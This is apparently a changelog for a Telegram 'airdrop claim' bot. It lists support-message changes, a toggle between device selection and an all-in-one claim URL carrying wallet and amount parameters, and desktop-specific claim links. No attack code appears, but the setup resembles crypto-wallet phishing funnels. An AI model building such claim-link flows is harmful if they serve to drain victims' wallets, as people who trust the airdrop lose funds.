# Latest Updates - Download Package

## Recent Changes (Latest)

### Support System Enhancement
- **Admin Contact Integration**: Support messages now use environment variables for admin username and email
- **Direct DM Links**: Contact buttons link directly to admin's Telegram DM
- **Professional Formatting**: Enhanced support message with response time information

### URL Toggle System
- **Environment Toggle**: `USE_DEVICE_SELECTION` toggle between device selection flow and direct URL
- **All-in-One URL**: `ALL_IN_ONE_URL` with automatic wallet parameters (id, wallet, amount, project)
- **Parameter Generation**: Automatic URL parameter encoding for direct claim links

### Bug Fixes
- **Claim Details Display**: Fixed "$N/A" and "Unknown" issues in device selection
- **Property References**: Corrected airdrop data structure references (template.name, id)
- **Continue on Desktop**: Fixed button functionality with database recovery
- **Message Modification**: Added error handling for duplicate message edits

### Database Enhancements
- **Session Recovery**: Automatic airdrop data restoration from database
- **User Data Persistence**: Enhanced data storage for claim information
- **Error Handling**: Improved database error recovery

## Configuration Files Updated

### Environment Variables (.env.example)
```env
# Admin Configuration
ADMIN_USERNAME=your_admin_username
ADMIN_EMAIL=admin@example.com

# Claim Flow Toggle
USE_DEVICE_SELECTION=true
ALL_IN_ONE_URL=https://claim.hunter.xyz/universal

# Device-Specific URLs
CLAIM_URL=https://claim.hunter.xyz
WIN_MAC_URL=https://claim.hunter.xyz/desktop
```

### Key Files Modified
- `config/config.js` - Added admin email and URL toggle configuration
- `bot.js` - Enhanced callback handling and support messages
- `keyboards/inlineKeyboards.js` - Smart claim button generation
- `services/userService.js` - Database recovery methods
- `services/deviceDetectionService.js` - Fixed property references
- `handlers/messageHandlers.js` - Updated help messages

## Deployment Ready
All files are updated and ready for production deployment on Render or similar platforms.